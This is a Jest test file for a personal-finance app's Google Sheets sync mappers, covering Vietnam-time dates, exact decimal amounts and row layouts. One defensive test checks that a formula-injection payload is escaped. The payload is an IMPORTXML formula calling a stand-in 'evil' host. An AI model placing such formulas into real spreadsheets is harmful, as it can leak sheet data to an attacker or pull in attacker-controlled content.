import { Prisma } from '@/generated/prisma/client';
import {
  buildMetaRows,
  formatIctDate,
  formatIctDateTime,
  mapAccountRows,
  mapBudgetRows,
  mapGoalRows,
  mapTransactionRows,
  toSheetText,
  toYearMonth,
  type TransactionSource,
} from './sync.mappers';

const dec = (value: string) => new Prisma.Decimal(value);

function tx(overrides: Partial<TransactionSource> = {}): TransactionSource {
  return {
    id: 'tx-1',
    createdAt: new Date('2026-10-13T05:00:00Z'), // 12:00 ICT
    type: 'EXPENSE',
    amount: dec('50000'),
    description: 'Cà phê',
    outcome: 'WORTH_IT',
    leakReason: null,
    reviewedAt: null,
    category: { name: 'Ăn uống' },
    account: { name: 'Tiền mặt' },
    ...overrides,
  };
}

describe('ICT date helpers', () => {
  it('maps 2026-09-30T18:00:00Z to 1 October in ICT', () => {
    const date = new Date('2026-09-30T18:00:00Z');
    expect(formatIctDate(date)).toBe('2026-10-01');
    expect(toYearMonth(date)).toBe(202610);
  });

  it('switches day at 17:00 UTC, not at UTC midnight', () => {
    expect(formatIctDate(new Date('2026-10-13T16:59:59Z'))).toBe('2026-10-13');
    expect(formatIctDate(new Date('2026-10-13T17:00:00Z'))).toBe('2026-10-14');
  });

  it('rolls the year over in ICT', () => {
    const date = new Date('2026-12-31T17:00:00Z');
    expect(formatIctDate(date)).toBe('2027-01-01');
    expect(toYearMonth(date)).toBe(202701);
  });

  it('formats date and time in ICT with zero padding', () => {
    expect(formatIctDateTime(new Date('2026-09-30T18:05:09Z'))).toBe(
      '2026-10-01 01:05:09',
    );
  });
});

describe('toSheetText', () => {
  it('returns an empty string for null and undefined', () => {
    expect(toSheetText(null)).toBe('');
    expect(toSheetText(undefined)).toBe('');
  });

  it('leaves ordinary text alone', () => {
    expect(toSheetText('Cà phê = 50k')).toBe('Cà phê = 50k');
  });

  it.each([
    '=SUM(1,2)',
    '+84 912 345 678',
    '-50k refund',
    '@mention',
    '\tTabbed',
    '\rReturn',
  ])('prefixes %j with an apostrophe so Sheets keeps it as text', (value) => {
    expect(toSheetText(value)).toBe(`'${value}`);
  });
});

describe('mapTransactionRows', () => {
  it('maps a transaction to the contract columns', () => {
    expect(mapTransactionRows([tx()])).toEqual([
      [
        'tx-1',
        '2026-10-13',
        202610,
        'EXPENSE',
        50000,
        'Ăn uống',
        'Tiền mặt',
        'Cà phê',
        'WORTH_IT',
        '',
        '',
      ],
    ]);
  });

  it('keeps Decimal amounts exact', () => {
    const [row] = mapTransactionRows([tx({ amount: dec('1234567.89') })]);
    expect(row[4]).toBe(1234567.89);
  });

  it('writes empty cells for null description, leak reason and reviewedAt', () => {
    const [row] = mapTransactionRows([tx({ description: null })]);
    expect(row[7]).toBe('');
    expect(row[9]).toBe('');
    expect(row[10]).toBe('');
  });

  it('writes the leak reason and the reviewed time in ICT', () => {
    const [row] = mapTransactionRows([
      tx({
        outcome: 'LEAK',
        leakReason: 'IMPULSIVE',
        reviewedAt: new Date('2026-10-14T01:30:00Z'),
      }),
    ]);
    expect(row[8]).toBe('LEAK');
    expect(row[9]).toBe('IMPULSIVE');
    expect(row[10]).toBe('2026-10-14 08:30:00');
  });

  it('guards free-text columns against formula injection', () => {
    const [row] = mapTransactionRows([
      tx({
        description: '=IMPORTXML("http://evil","//a")',
        category: { name: '-Quà' },
        account: { name: '+Ví' },
      }),
    ]);
    expect(row[5]).toBe("'-Quà");
    expect(row[6]).toBe("'+Ví");
    expect(row[7]).toBe(`'=IMPORTXML("http://evil","//a")`);
  });

  it('preserves the order it is given', () => {
    const rows = mapTransactionRows([tx({ id: 'b' }), tx({ id: 'a' })]);
    expect(rows.map((row) => row[0])).toEqual(['b', 'a']);
  });
});

describe('mapAccountRows', () => {
  it('maps balances as exact numbers and guards the name', () => {
    expect(
      mapAccountRows([
        {
          id: 'acc-1',
          name: '=Ví',
          type: 'LIQUID',
          initialBalance: dec('100000'),
          currentBalance: dec('40000.5'),
        },
      ]),
    ).toEqual([['acc-1', "'=Ví", 'LIQUID', 100000, 40000.5]]);
  });
});

describe('mapBudgetRows', () => {
  it('encodes year and month as one integer', () => {
    expect(
      mapBudgetRows([
        {
          year: 2026,
          month: 10,
          amount: dec('3000000'),
          category: { name: 'Ăn uống' },
        },
      ]),
    ).toEqual([[202610, 'Ăn uống', 3000000]]);
  });
});

describe('mapGoalRows', () => {
  it('maps a date-only target date without shifting the day', () => {
    expect(
      mapGoalRows([
        {
          id: 'goal-1',
          name: 'Du lịch',
          targetAmount: dec('20000000'),
          savedAmount: dec('2500000'),
          targetDate: new Date('2026-12-31T00:00:00Z'),
        },
      ]),
    ).toEqual([['goal-1', 'Du lịch', 20000000, 2500000, '2026-12-31']]);
  });

  it('writes an empty cell when there is no target date', () => {
    const [row] = mapGoalRows([
      {
        id: 'goal-2',
        name: 'Quỹ khẩn cấp',
        targetAmount: dec('1'),
        savedAmount: dec('0'),
        targetDate: null,
      },
    ]);
    expect(row[4]).toBe('');
  });
});

describe('buildMetaRows', () => {
  it('counts every transaction but sums only expenses, exactly', () => {
    const rows = buildMetaRows({
      now: new Date('2026-10-13T05:00:00Z'),
      transactions: [
        tx({ amount: dec('100000.25') }),
        tx({ amount: dec('50000.25') }),
        tx({ type: 'INCOME', amount: dec('999') }),
      ],
    });
    expect(rows).toEqual([
      ['schema_version', 1],
      ['last_synced_at', '2026-10-13 12:00:00'],
      ['timezone', 'Asia/Ho_Chi_Minh'],
      ['currency', 'VND'],
      ['tx_count', 3],
      ['expense_total', 150000.5],
    ]);
  });

  it('reports zeros for a user with no transactions', () => {
    const rows = buildMetaRows({
      now: new Date('2026-10-13T05:00:00Z'),
      transactions: [],
    });
    expect(rows.find((row) => row[0] === 'tx_count')).toEqual(['tx_count', 0]);
    expect(rows.find((row) => row[0] === 'expense_total')).toEqual([
      'expense_total',
      0,
    ]);
  });
});
